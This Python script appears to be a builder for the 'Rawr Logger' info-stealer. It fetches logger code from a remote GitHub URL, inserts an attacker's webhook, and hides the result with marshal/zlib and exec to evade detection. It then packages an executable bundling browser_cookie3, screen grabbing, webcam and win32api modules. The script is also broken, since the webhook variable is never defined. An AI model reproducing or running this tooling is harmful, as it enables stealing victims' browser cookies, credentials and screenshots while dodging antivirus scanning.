import marshal
import zlib
import requests
from pystyle import *
import os
import time
import shutil
Write.Print(Center.XCenter("""
 /$$   /$$                            /$$$$$$                        /$$                            
| $$  /$$/                           /$$__  $$                      | $$                            
| $$ /$$/   /$$$$$$  /$$   /$$      | $$  \__/ /$$   /$$  /$$$$$$$ /$$$$$$    /$$$$$$  /$$$$$$/$$$$ 
| $$$$$/   /$$__  $$| $$  | $$      |  $$$$$$ | $$  | $$ /$$_____/|_  $$_/   /$$__  $$| $$_  $$_  $$
| $$  $$  | $$$$$$$$| $$  | $$       \____  $$| $$  | $$|  $$$$$$   | $$    | $$$$$$$$| $$ \ $$ \ $$
| $$\  $$ | $$_____/| $$  | $$       /$$  \ $$| $$  | $$ \____  $$  | $$ /$$| $$_____/| $$ | $$ | $$
| $$ \  $$|  $$$$$$$|  $$$$$$$      |  $$$$$$/|  $$$$$$$ /$$$$$$$/  |  $$$$/|  $$$$$$$| $$ | $$ | $$
|__/  \__/ \_______/ \____  $$       \______/  \____  $$|_______/    \___/   \_______/|__/ |__/ |__/
                     /$$  | $$                 /$$  | $$                                            
                    |  $$$$$$/                |  $$$$$$/                                            
                     \______/                  \______/                                             
              Made By mishonov#0001                                                                               
\n"""), Colors.green_to_yellow, interval=0)
name = Write.Input("Enter Your Name:", Colors.green_to_yellow, interval=0.01)
code = requests.get("https://raw.githubusercontent.com/Joseloll/Rawr-Logger/main/logger.py")
with open(f"{name}.py", 'w', encoding='utf8') as f:
    f.write(code.text.replace("Webhooksss", webhook))
Write.Print("Rawr Logger Was SucessFully Built\n",Colors.white_to_green, interval=0.01)
prot = Write.Input(f"Adding Protection Now To {name} Also Click Enter To Contine",Colors.white_to_green, interval=0.01)
with open(f'{name}.py') as fi:
    pro = fi.read()
    mar = marshal.dumps(pro)
    zlb = zlib.compress(mar)
    with open(f"{name}.py", 'w') as f:
        f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
    compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
    if compile == "y":
        os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="pystyle"  --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3"  --hidden-import="json"  --hidden-import="platform"  --hidden-import="re"  --hidden-import="uuid" --hidden-import="psutil"  --hidden-import="cv2" --hidden-import="psutil"  --hidden-import="win32api" {name}.py')
        os.remove(f'{name}.spec')
        Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
        time.sleep(2)
        Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
        time.sleep(3)
        exit()
    elif compile == "n":
      Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
      time.sleep(3)
      exit()
